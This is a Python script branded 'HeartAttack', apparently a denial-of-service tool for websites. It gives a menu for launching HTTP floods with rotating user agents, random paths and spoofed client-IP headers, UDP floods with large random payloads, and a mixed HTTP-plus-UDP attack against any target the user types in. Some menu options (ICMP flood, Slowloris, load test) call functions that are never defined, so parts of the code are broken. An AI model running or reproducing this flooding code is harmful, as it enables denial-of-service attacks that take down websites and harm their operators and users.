import os
import sys
import time
import threading
import socket
import random
import subprocess
import urllib.request
import ssl
import struct
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

class Colors:
    PINK = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Global variables for attack control
attack_running = False
request_count = 0
success_count = 0
failed_count = 0

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_banner():
    clear_screen()
    print(f"{Colors.PINK}")
    if os.system("figlet -f big HeartAttack > /dev/null 2>&1") != 0:
        print("HeartAttack - No Root Edition")
    else:
        os.system("figlet -f big HeartAttack")
    print(f"{Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}   🚀 DDoS Tools for Website by Dylphiiee🍪 {Colors.END}")
    print(f"{Colors.BLUE}{'='*60}{Colors.END}\n")

def get_ping_time(target):
    try:
        clean_target = target.replace("http://", "").replace("https://", "").split("/")[0]
        
        start_time = time.time()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((clean_target, 80))
        sock.close()
        ping_time = (time.time() - start_time) * 1000
        return ping_time
    except:
        return None

def display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time):
    remaining = max(0, duration - elapsed)
    
    rps = request_count / elapsed if elapsed > 0 else 0
    
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{Colors.PINK}{'='*60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}           DDoS ATTACK IN PROGRESS{Colors.END}")
    print(f"{Colors.PINK}{'='*60}{Colors.END}")
    print(f"{Colors.YELLOW}🌐 Target    : {Colors.GREEN}{target}:{port}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️  Duration  : {Colors.GREEN}{duration}s (Remaining: {remaining:.1f}s){Colors.END}")
    print(f"{Colors.YELLOW}📊 Requests  : {Colors.GREEN}{request_count} (Success: {success_count}, Failed: {failed_count}){Colors.END}")
    print(f"{Colors.YELLOW}🚀 Speed     : {Colors.GREEN}{rps:.1f} requests/second{Colors.END}")
    print(f"{Colors.YELLOW}📡 Ping      : {Colors.GREEN}{ping_time:.2f} ms{Colors.END}")
    print(f"{Colors.PINK}{'='*60}{Colors.END}")
    
    progress = min(100, (elapsed / duration) * 100)
    bar_length = 50
    filled_length = int(bar_length * progress // 100)
    bar = "█" * filled_length + "░" * (bar_length - filled_length)
    print(f"{Colors.CYAN}Progress: [{bar}] {progress:.1f}%{Colors.END}")
    print(f"{Colors.PINK}{'='*60}{Colors.END}")

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def http_flood_enhanced(target, port, duration, threads):
    global attack_running, request_count, success_count, failed_count
    clear_screen()
    print(f"{Colors.RED}🚀 Starting Enhanced HTTP Flood attack to {target}...{Colors.END}")
    time.sleep(2)
    
    request_count = 0
    success_count = 0
    failed_count = 0
    start_time = time.time()
    end_time = start_time + duration
    attack_running = True

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
        "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59"
    ]

    paths = [
        "/", "/admin", "/wp-login.php", "/api", "/search", "/test",
        "/robots.txt", "/sitemap.xml", "/.env", "/config", "/db",
        "/login", "/register", "/contact", "/about", "/products",
        "/blog", "/news", "/images", "/css", "/js", "/ajax",
        "/user", "/account", "/payment", "/checkout", "/cart"
    ]

    referers = [
        "https://www.google.com/", "https://www.bing.com/", "https://www.yahoo.com/",
        "https://www.facebook.com/", "https://www.twitter.com/", "https://www.reddit.com/",
        "https://www.linkedin.com/", "https://www.instagram.com/", "https://www.pinterest.com/"
    ]

    def send_requests():
        while attack_running and time.time() < end_time:
            try:
                # Create a new socket for each request to avoid connection reuse
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((target, port))
                
                # Send multiple requests per connection
                for _ in range(random.randint(10, 30)):
                    try:
                        user_agent = random.choice(user_agents)
                        path = random.choice(paths)
                        referer = random.choice(referers)
                        
                        # Create a more realistic HTTP request
                        request = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {target}\r\n"
                            f"User-Agent: {user_agent}\r\n"
                            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                            f"Accept-Language: en-US,en;q=0.5\r\n"
                            f"Accept-Encoding: gzip, deflate, br\r\n"
                            f"Referer: {referer}\r\n"
                            f"Connection: keep-alive\r\n"
                            f"Cache-Control: max-age=0\r\n"
                            f"Upgrade-Insecure-Requests: 1\r\n"
                            f"X-Forwarded-For: {generate_random_ip()}\r\n"
                            f"X-Real-IP: {generate_random_ip()}\r\n"
                            f"CF-Connecting-IP: {generate_random_ip()}\r\n\r\n"
                        )
                        s.sendall(request.encode())
                        request_count += 1
                        success_count += 1
                    except:
                        failed_count += 1
                        break
                s.close()
            except Exception as e:
                failed_count += 1
                try:
                    s.close()
                except:
                    pass

    # Use ThreadPoolExecutor for better thread management
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(send_requests) for _ in range(threads)]
        
        last_ping_check = 0
        ping_time = 0
        
        while attack_running and time.time() < end_time:
            elapsed = time.time() - start_time
            
            if time.time() - last_ping_check > 5:
                ping_result = get_ping_time(target)
                if ping_result:
                    ping_time = ping_result
                last_ping_check = time.time()
            
            display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
            time.sleep(0.5)
    
    attack_running = False
    elapsed = time.time() - start_time
    display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total requests: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}✅ Success: {success_count}{Colors.END}")
    print(f"{Colors.YELLOW}❌ Failed: {failed_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {request_count/total_time:.2f} requests/second{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")

def udp_flood_enhanced(target, port, duration, threads):
    global attack_running, request_count, success_count, failed_count
    clear_screen()
    print(f"{Colors.RED}🚀 Starting Enhanced UDP Flood attack to {target}:{port}...{Colors.END}")
    time.sleep(2)
    
    request_count = 0
    success_count = 0
    failed_count = 0
    start_time = time.time()
    end_time = start_time + duration
    attack_running = True

    def send_udp():
        while attack_running and time.time() < end_time:
            try:
                # Create a new socket for each packet
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
                # Generate larger and more random payload
                payload_size = random.randint(1024, 65507)  # Max UDP packet size
                payload = random._urandom(payload_size)
                
                # Send multiple packets per socket
                for _ in range(random.randint(5, 15)):
                    sock.sendto(payload, (target, port))
                    request_count += 1
                    success_count += 1
                
                sock.close()
            except Exception as e:
                failed_count += 1
                try:
                    sock.close()
                except:
                    pass

    # Use ThreadPoolExecutor for better thread management
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(send_udp) for _ in range(threads)]
        
        last_ping_check = 0
        ping_time = 0
        
        while attack_running and time.time() < end_time:
            elapsed = time.time() - start_time
            
            if time.time() - last_ping_check > 5:
                ping_result = get_ping_time(target)
                if ping_result:
                    ping_time = ping_result
                last_ping_check = time.time()
            
            display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
            time.sleep(0.5)
    
    attack_running = False
    elapsed = time.time() - start_time
    display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total packets: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}✅ Success: {success_count}{Colors.END}")
    print(f"{Colors.YELLOW}❌ Failed: {failed_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {request_count/total_time:.2f} packets/second{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")

def mixed_attack(target, port, duration, threads):
    global attack_running, request_count, success_count, failed_count
    clear_screen()
    print(f"{Colors.RED}🚀 Starting Mixed Attack to {target}:{port}...{Colors.END}")
    time.sleep(2)
    
    request_count = 0
    success_count = 0
    failed_count = 0
    start_time = time.time()
    end_time = start_time + duration
    attack_running = True

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    ]

    paths = [
        "/", "/admin", "/wp-login.php", "/api", "/search", "/test",
        "/robots.txt", "/sitemap.xml", "/.env", "/config", "/db"
    ]

    def http_attack():
        while attack_running and time.time() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                
                for _ in range(random.randint(5, 15)):
                    try:
                        user_agent = random.choice(user_agents)
                        path = random.choice(paths)
                        request = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {target}\r\n"
                            f"User-Agent: {user_agent}\r\n"
                            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                            f"Accept-Language: en-US,en;q=0.5\r\n"
                            f"Accept-Encoding: gzip, deflate\r\n"
                            f"Connection: keep-alive\r\n"
                            f"Cache-Control: max-age=0\r\n"
                            f"X-Forwarded-For: {generate_random_ip()}\r\n\r\n"
                        )
                        s.sendall(request.encode())
                        request_count += 1
                        success_count += 1
                    except:
                        failed_count += 1
                        break
                s.close()
            except Exception as e:
                failed_count += 1

    def udp_attack():
        while attack_running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                payload = random._urandom(random.randint(1024, 65507))
                sock.sendto(payload, (target, port))
                sock.close()
                
                request_count += 1
                success_count += 1
            except Exception as e:
                failed_count += 1

    # Use ThreadPoolExecutor for better thread management
    with ThreadPoolExecutor(max_workers=threads) as executor:
        # Half threads for HTTP, half for UDP
        http_threads = max(1, threads // 2)
        udp_threads = max(1, threads - http_threads)
        
        http_futures = [executor.submit(http_attack) for _ in range(http_threads)]
        udp_futures = [executor.submit(udp_attack) for _ in range(udp_threads)]
        
        last_ping_check = 0
        ping_time = 0
        
        while attack_running and time.time() < end_time:
            elapsed = time.time() - start_time
            
            if time.time() - last_ping_check > 5:
                ping_result = get_ping_time(target)
                if ping_result:
                    ping_time = ping_result
                last_ping_check = time.time()
            
            display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
            time.sleep(0.5)
    
    attack_running = False
    elapsed = time.time() - start_time
    display_attack_info(target, port, duration, elapsed, request_count, success_count, failed_count, ping_time)
    
    total_time = time.time() - start_time
    print(f"\n{Colors.GREEN}✅ Attack completed!{Colors.END}")
    print(f"{Colors.YELLOW}📊 Total requests: {request_count}{Colors.END}")
    print(f"{Colors.YELLOW}✅ Success: {success_count}{Colors.END}")
    print(f"{Colors.YELLOW}❌ Failed: {failed_count}{Colors.END}")
    print(f"{Colors.YELLOW}⏱️ Duration: {total_time:.2f} seconds{Colors.END}")
    print(f"{Colors.YELLOW}📡 Average: {request_count/total_time:.2f} requests/second{Colors.END}")
    
    input(f"\n{Colors.CYAN}Press Enter to return to menu...{Colors.END}")

def web_attack():
    clear_screen()
    print(f"{Colors.PINK}")
    if os.system("figlet -f small Web Attack > /dev/null 2>&1") != 0:
        print("Web Attack")
    else:
        os.system("figlet -f small Web Attack")
    print(f"{Colors.END}")
    print(f"{Colors.CYAN}🌐 Select Web Attack Method:{Colors.END}")
    print(f"{Colors.YELLOW}1. Enhanced HTTP Flood 💦{Colors.END}")
    print(f"{Colors.YELLOW}2. Enhanced UDP Flood 📨{Colors.END}")
    print(f"{Colors.YELLOW}3. Mixed Attack (HTTP+UDP) 🔥{Colors.END}")
    print(f"{Colors.YELLOW}4. ICMP Flood 📡{Colors.END}")
    print(f"{Colors.YELLOW}5. Slowloris Attack 🐌{Colors.END}")
    print(f"{Colors.YELLOW}6. URL Load Test 🌐{Colors.END}")
    print(f"{Colors.YELLOW}7. Back 🔙{Colors.END}")

    choice = input(f"{Colors.GREEN}🎯 Select method (1-7): {Colors.END}")
    if choice == "7":
        return

    if choice in ["1", "2", "3", "5"]:
        target = input(f"{Colors.GREEN}🌐 Target IP/domain: {Colors.END}")
        port = input(f"{Colors.GREEN}🔌 Port (default: 80): {Colors.END}") or "80"
        try:
            port = int(port)
        except:
            print(f"{Colors.RED}❌ Port must be a number!{Colors.END}")
            time.sleep(2)
            return web_attack()
    elif choice in ["4", "6"]:
        target = input(f"{Colors.GREEN}🌐 Target IP/domain: {Colors.END}")
        port = None
    else:
        print(f"{Colors.RED}❌ Invalid choice!{Colors.END}")
        time.sleep(2)
        return web_attack()
    
    duration = input(f"{Colors.GREEN}⏱️ Duration (seconds): {Colors.END}")
    try:
        duration = int(duration)
    except:
        print(f"{Colors.RED}❌ Duration must be a number!{Colors.END}")
        time.sleep(2)
        return web_attack()
    
    threads = input(f"{Colors.GREEN}🧵 Threads (default: 100): {Colors.END}") or "100"
    try:
        threads = int(threads)
    except:
        print(f"{Colors.RED}❌ Threads must be a number!{Colors.END}")
        time.sleep(2)
        return web_attack()

    if choice == "1":
        http_flood_enhanced(target, port, duration, threads)
    elif choice == "2":
        udp_flood_enhanced(target, port, duration, threads)
    elif choice == "3":
        mixed_attack(target, port, duration, threads)
    elif choice == "4":
        icmp_flood(target, duration, threads)
    elif choice == "5":
        sockets = input(f"{Colors.GREEN}🔗 Number of sockets (default: 200): {Colors.END}") or "200"
        try:
            sockets = int(sockets)
        except:
            print(f"{Colors.RED}❌ Sockets must be a number!{Colors.END}")
            time.sleep(2)
            return web_attack()
        slowloris_attack(target, port, duration, sockets)
    elif choice == "6":
        url_load_test(target, duration, threads)

def stop_attack():
    global attack_running
    attack_running = False
    print(f"{Colors.RED}🛑 Stopping attack...{Colors.END}")

def main():
    show_banner()

    while True:
        show_banner()
        print(f"{Colors.CYAN}Select option:{Colors.END}")
        print(f"{Colors.YELLOW}1. WebAttack 🌐{Colors.END}")
        print(f"{Colors.YELLOW}2. Stop Attack 🛑{Colors.END}")
        print(f"{Colors.YELLOW}3. Exit 🚪{Colors.END}")

        choice = input(f"{Colors.GREEN}🎯 Select option (1-3): {Colors.END}")
        if choice == "1":
            web_attack()
        elif choice == "2":
            stop_attack()
            time.sleep(1)
        elif choice == "3":
            print(f"{Colors.PINK}❤️  Thank you for using HeartAttack by Dylphiiee🍪{Colors.END}")
            break
        else:
            print(f"{Colors.RED}❌ Invalid option!{Colors.END}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}⚠️ Program terminated by user{Colors.END}")
        sys.exit(0)
